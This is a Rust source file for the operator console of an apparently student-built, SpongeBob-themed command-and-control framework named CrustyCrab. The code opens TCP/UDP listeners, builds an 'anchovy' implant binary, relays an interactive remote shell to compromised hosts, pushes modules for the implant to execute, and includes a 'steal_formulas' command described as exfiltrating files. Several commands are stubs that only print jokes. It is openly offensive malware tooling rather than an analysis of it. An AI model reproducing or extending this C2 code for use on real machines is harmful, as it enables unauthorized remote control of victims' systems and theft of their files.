// Ignore Warnings
#![allow(unused_variables)]
#![allow(unused_mut)]
#![allow(unused_imports)]
#![allow(unused_must_use)]
#![allow(unused_assignments)]
#![allow(unreachable_code)]
#![allow(dead_code)]

use std::{fs, process};
use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket, TcpListener, TcpStream, Shutdown};
use std::process::{Command, Output};
use rand::Rng;
use regex::Regex;
use log::{info, warn, error, debug};
use crabby_patty_formula::*;
use std::{thread, time};
use std::sync::{Arc, Mutex};
use std::mem::drop;
use std::env::{self, current_dir};
use std::path::Path;

mod usr_mods;

extern crate directories;
use directories::UserDirs;

extern crate rustyline;
use rustyline::{history, hint, completion, highlight, line_buffer};

fn main() {
    // clear console first
    Command::new("clear").status().unwrap();
    // print the super cool banner
    banner();

    //Vec<(ID, PORT, PROTOCOL, )>
    let mut listen_tracker: Vec<(u64, u16, String)> = Vec::new();
    let mut anchovy_list: Vec<(Vec<(u64, u16, String)>, Arc<Mutex<SharedBuffer>>)> = Vec::new();
    let mut relay_port = 2000;
    let mut sb_arc = Arc::new(Mutex::new(SharedBuffer {
        cc: 0,
        buff: [0; 2048].to_vec(),
    }));
    //Defaults
    let mut protocol: u16 = 2;
    let mut listen_port: u16 = 2120;
    let mut local_address = SocketAddr::from(([127, 0, 0, 1], listen_port));
    let mut curr_module = String::new();
    // main program loop
    loop {
        // print the prompt and read in a command
        // !TODO Make main shell more posix compliant

        io::stdout().flush().unwrap();
        let mut rust_inline = rustyline::DefaultEditor::new();
        let mut usr_cmd = String::new();
        let mut prompt = String::new();
        if current_dir().unwrap().file_name().is_none() {
            prompt = format!("\x1b[33mCrustyCrab ({}) $ \x1b[0m", current_dir().unwrap().display());
        }
        else {
            prompt = format!("\x1b[33mCrustyCrab ({}/) $ \x1b[0m", current_dir().unwrap().file_name().unwrap().to_str().unwrap());
        }
        let mut input = rust_inline.expect("failed to execute process").readline(prompt.as_str());
        if input.is_err() {
            continue;
        }
        else {
            usr_cmd = input.unwrap();
        }

        // regex that removes multiple spaces
        let re = Regex::new(r"\s+").unwrap();
        usr_cmd = re.replace_all(&usr_cmd, " ").to_string();
        //let re = Regex::new(r"");


        // allows user to execute multiple commands in a single line seperated by ;
        let mut cmds = usr_cmd.split(';');

        // loop through each command given
        let user = UserDirs::new().unwrap();
        let mut head = cmds.next();
        while head != None {
            let current_cmd = head.unwrap().trim().replace("~", user.home_dir().to_str().unwrap());

            if current_cmd.eq("exit") || current_cmd.eq("quit") || current_cmd.eq("q"){ 
                // quit the program
                process::exit(0);
            } 
            else if current_cmd.starts_with("help") { 
                // print the help menu
                help();
            }
            else if current_cmd.contains("|") || current_cmd.contains(">"){
                let mut result = Command::new("sh").arg("-c").arg(current_cmd).status().unwrap();
            }
            else if current_cmd.starts_with("cd") {
                if current_cmd.len() > 2 {
                    let mut split_cmd = current_cmd.split(" ");
                    split_cmd.next();
                    let user = UserDirs::new().unwrap();
                    let dir = split_cmd.next().unwrap();
                    if Path::new(&dir).exists() {
                        if env::set_current_dir(&dir).is_err() {
                            // Will set the directory if no errors are envoked.
                            println!("cd: permission denied: {dir}")
                        }  
                    }
                    else {
                        println!("cd: no such file or directory: {dir}");
                    }
                }
                else {
                    if env::set_current_dir(user.home_dir()).is_err() {
                        // Will set the directory to home if no errors are envoked.
                        println!("cd: permission denied: {}", user.home_dir().to_str().unwrap())
                    }
                }
            }
            else if current_cmd.eq("banner") { // print the banner
                banner();
            }
            else if current_cmd.eq("listen") {
                println!("\x1b[33m[+] Opening Crusty Crab\x1b[0m");
                info!("[+] Opening Crusty Crab");

                //Passes vector of listeners and current port
                sb_arc = Arc::clone(&open_crusty_crab(&mut listen_tracker, listen_port, local_address, protocol));
            }
            else if current_cmd.contains("exec") {
                println!("\x1b[33m[+] Executing command\x1b[0m");
                info!("[+] Executing command");
            }
            else if current_cmd.contains("shell"){
                println!("[+] Entering shell");
                sb_arc = Arc::clone(&shell(sb_arc.clone()));
            }
            else if current_cmd.eq("mod"){
                usr_mods::list_mods();
            }
            else if current_cmd.contains("use"){
                let mut command = current_cmd.split(' ');
                command.next();
                let module = command.next().unwrap().trim();
                curr_module = module.to_owned();
                println!("Module set to: {:?}", curr_module);
            }
            else if current_cmd.eq("send"){
                if curr_module.len() > 1{
                    sb_arc = Arc::clone(&send_module(sb_arc.clone(), curr_module.as_str()));
                }
                else{
                    println!("Select a valid module!");
                }
            }
            else if current_cmd.eq("steal_formulas"){
                sb_arc = Arc::clone(&steal_formulas(sb_arc.clone()));
            }
            else if current_cmd.contains("set") {
                // look for all commands that contain set
                let mut command = current_cmd.split(' ');

                command.next();
                let check = command.next();

                if check != None {
                    let curr = check.unwrap();
                    if curr.eq("listen") {
                        // list all anchovies and get all info
    
                        let option = command.next().unwrap().trim();
                        let value = command.next().unwrap().trim();
    
                        if option.eq("port") {
                            
                            //Error check on setting port 
                            let result: Result<u16, _> = value.parse();
                            match result{
                                Ok(result) => {
                                listen_port = value.parse().unwrap();
                                local_address = SocketAddr::from(([127, 0, 0, 1], listen_port));
                                println!("\x1b[33m[+] Setting default listener port to {}\x1b[0m", listen_port);},
                                Err(e) => println!("\x1b[33mThose are the wrong ingredients!\x1b[0m"),
                            }
                        }
                        else if option.eq("protocol"){
                            match value{
                                "udp" | "UDP" => {protocol = 1;  
                                    println!("\x1b[33m[+] Setting default listener protocol to {}\x1b[0m", "UDP");},
                                "tcp" | "TCP" => {protocol = 2;
                                    println!("\x1b[33m[+] Setting default listener protocol to {}\x1b[0m", "TCP");},
                                "http" | "HTTP" => println!("\x1b[31mWe didn't finish making your crabby patty yet!\x1b[0m"),
                                "dns" | "DNS" => println!("\x1b[31mWe didn't finish making your crabby patty yet!\x1b[0m"),
                                &_ => println!("\x1b[31mThose are the wrong ingredients!\x1b[0m"),
                            }
                        }
                    }
                    else if curr.eq("payload"){
                        println!("\x1b[33mSending out patty\x1b[0m")
                    }
                    else if curr.eq("anchovy"){
                        // kill anchovy based on its number
    
                        let option = command.next().unwrap().trim();
                        let value = command.next().unwrap().trim();
    
                        if option.eq("ip"){
                            println!("\x1b[33m[+] Setting anchovy server ip to {}\x1b[0m", value);
                        }
                        else if option.eq("os"){
                            println!("\x1b[33m[+] Setting default anchovy os to {}\x1b[0m", value);
                        }
                        println!("\x1b[32msPongBOB what are you doin to me customers\x1b[0m");
                    }
                }
                else {
                    println!("AAARRRRRGGG! SpongeBob me boy! Not enough parameters!")
                }
            }
            else if current_cmd.contains("anchovy") {
                let mut command = current_cmd.split(' ');

                command.next();
                let option = command.next().unwrap().trim();
                let value = command.next().unwrap().trim();
                if option.eq("list") {
                    // list all anchovies and get all info
                    println!("\x1b[33m[+] Listing all anchovies\x1b[0m");
                    println!("\x1b[32mSpongebob look at all the customers me boi \x1b[0m");
                }
                else if option.contains("select"){
                    println!("\x1b[33m[+] Selected anchovy {}\x1b[0m", value);
                    println!("\x1b[33mOne krabby patty coming up (anchovy select)\x1b[0m");
                }
                else if option.eq("spawn"){
                    create_anchovy();
                }
                else if option.contains("kill"){
                    // kill anchovy based on its number
                    println!("\x1b[33m[-] Killing anchovy\x1b[0m");
                    println!("\x1b[32msPongBOB what are you doin to me customers (anchovy kill)\x1b[0m");
                }
            }
            else if current_cmd.contains("listen") {
                let mut command = current_cmd.split(' ');

                command.next();

                let mut curr_head = command.next();
                let mut curr = curr_head.unwrap().trim();
                if curr.eq("exit") {
                    // list all anchovies and get all info
                    println!("\x1b[32mSquidward take the trash out its time to close\x1b[0m");
                }
                else if curr.contains("kill"){
                    let value = command.next().unwrap().trim();
                    
                    println!("\x1b[33mClosing the register\x1b[0m");
                }
                else if curr.eq("list"){
                    println!("\x1b[34m\nID\tPORT\tPROTOCOL\x1b[0m");
                    println!("\x1b[34m------------------------------------------\x1b[0m");
                    for listener in &listen_tracker{
                        println!("\x1b[34m{:?}\t{:?}\t{}\x1b[0m", listener.0, listener.1, listener.2.to_string().to_uppercase());
                    }
                    println!("\x1b[34m------------------------------------------\x1b[0m");
                    println!("\x1b[32mSpongebob look at all me customers!\n\x1b[0m");
                }
            }
            else if current_cmd.len() > 0 {
                let mut split_cmd = current_cmd.split_whitespace();
                let cmd = split_cmd.next().unwrap();
                let last_args: Vec<&str> = split_cmd.collect();
                let test_args = last_args.clone();
                if Command::new(cmd).args(test_args).status().is_ok() {}
                else {
                    println!("Crusty_Crab: command not found: {}", cmd)
                }
            }

            head = cmds.next();
        }
    }
}

// prints random ascii art
fn banner(){
    let mut rng = rand::thread_rng();

    let banner = format!("static/art/banner{}.txt",rng.gen_range(0..13));
    let contents = fs::read_to_string(&banner);

    println!("\x1b[32m{c}\n\x1b[0m", c=contents.unwrap());
}


// prints help optional second argument for more specific details
fn help(){
    let contents = fs::read_to_string("static/help.txt");
    println!("\x1b[36m{c}\n\x1b[0m", c=contents.unwrap());
}


// creates implant for server ip
fn create_anchovy() {
    println!("\x1b[32mSpongebob there's another anchovy\x1b[0m");

    let mut binding = Command::new("sh");
    let mut result  = binding.arg("-c").arg("cargo build -q --bin implant");
}


// open listener
fn open_crusty_crab(listeners: &mut Vec<(u64, u16, String)>, relay_port: u16, address: SocketAddr, prot_type: u16) -> Arc<Mutex<SharedBuffer>>{

    //Create a new listener
    let mut new_listen = new_lsn(listeners.len() as u64);
    let mut protocol = "udp";
    if prot_type == 1{
        protocol = "udp";
        
    }
    else if prot_type == 2{
        protocol = "tcp";
    }
    listeners.push(((listeners.len() as u64) + 1, relay_port, protocol.to_string()));
    
    //Create the shared buff and clone 
    let mut sb: Arc<Mutex<SharedBuffer>> = Arc::new(Mutex::new(SharedBuffer {
        cc: 0,
        buff: [0; 2048].to_vec(),
    }));

    let mut sb_arc = Arc::clone(&sb);
    
    let thr = thread::spawn(move ||
        {
            crabby_patty_formula::lsn_run(&mut new_listen, protocol, address, &mut sb);
        }
    );
    thread::sleep(time::Duration::from_millis(10));
    return sb_arc;

}


// Creates interactive shell with implant
// Exit shell with "exit" or "Exit"
fn shell(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{
    let mut code: u8 = 5;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }

    let mut swap = true;
    let mut exit_flag = false;
    // now we interact
    print!("anchovy_shell $ ");
    io::stdout().flush().unwrap();
    let mut memo: String = String::new();
    loop {
        if swap {
            //Exit command was given
            if exit_flag{
                let mut buffer = sb.lock().unwrap();
                buffer.cc = 101;
                break;
            }
            io::stdout().flush().unwrap();
            // read from stdin
            io::stdin().read_line(&mut memo);
            // check if we need to execute a module
            // write command to shared buffer
            let mut buffer = sb.lock().unwrap();
            buffer.buff = memo.as_bytes().to_vec();
            swap = false;
        }
        else {
            let mut buffer = sb.lock().unwrap();
            if  String::from_utf8_lossy(&buffer.buff[..]).contains("Exiting Shell"){
                io::stdout().flush().unwrap();
                swap = true;
                exit_flag = true;
            }
            else if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
                print!("{}\nanchovy_shell $ ", String::from_utf8_lossy(&buffer.buff[..]));
                io::stdout().flush().unwrap();
                memo = String::new();
                swap = true;
            }
        }

        // wait until shared buffer changes
        // print changed shared buffer
        thread::sleep(time::Duration::from_millis(10));
    }
    
    return sb;
    
}


// Sends command for implant to execute module 
fn send_module(sb: Arc<Mutex<SharedBuffer>>, module: &str) -> Arc<Mutex<SharedBuffer>>{
    let mut code: u8 = 6;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }
    let mut memo: String = module.to_string();
    let mut swap = true;
    loop {
        if swap {
            io::stdout().flush().unwrap();
            memo = module.to_string();
            // write to shared buffer
            let mut buffer = sb.lock().unwrap();
            buffer.cc = 6;
            buffer.buff = memo.as_bytes().to_vec();
            swap = false;
        }
        else {
            let mut buffer = sb.lock().unwrap();
            if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
                let mut write_string = String::from_utf8_lossy(&buffer.buff[..]);
                println!("{}", String::from_utf8_lossy(&buffer.buff[..]));
                io::stdout().flush().unwrap();
                memo = String::new();
                break;
            }
        }
        thread::sleep(time::Duration::from_millis(10));
    }

    // 101 code keeps implant connected
    // but goes back to main loop
    let mut code: u8 = 101;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }
    return sb;
}


// Exfil files in .secret_formulas dir
// Modules should check if dir is already created, if not create dir 
// Similar code to shell/module (no read in "if swap")
fn steal_formulas(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{

    let mut code: u8 = 7;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }
    let mut memo: String = String::new();
    let mut swap = true;
    loop {
        if swap {
            io::stdout().flush().unwrap();
            // write to shared buffer
            let mut buffer = sb.lock().unwrap();
            buffer.cc = 7;
            buffer.buff = memo.as_bytes().to_vec();
            swap = false;
        }
        else {
            let mut buffer = sb.lock().unwrap();
            if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
                let mut write_string = String::from_utf8_lossy(&buffer.buff[..]);
                println!("{}", String::from_utf8_lossy(&buffer.buff[..]));
                io::stdout().flush().unwrap();
                memo = String::new();
                break;
            }
            break;
        }
        thread::sleep(time::Duration::from_millis(10));
    }
    
    // 101 code keeps implant connected
    // but goes back to main loop
    let mut code: u8 = 101;
    if true {
        let mut buffer = sb.lock().unwrap();
        buffer.cc = code;
    }
    return sb;

}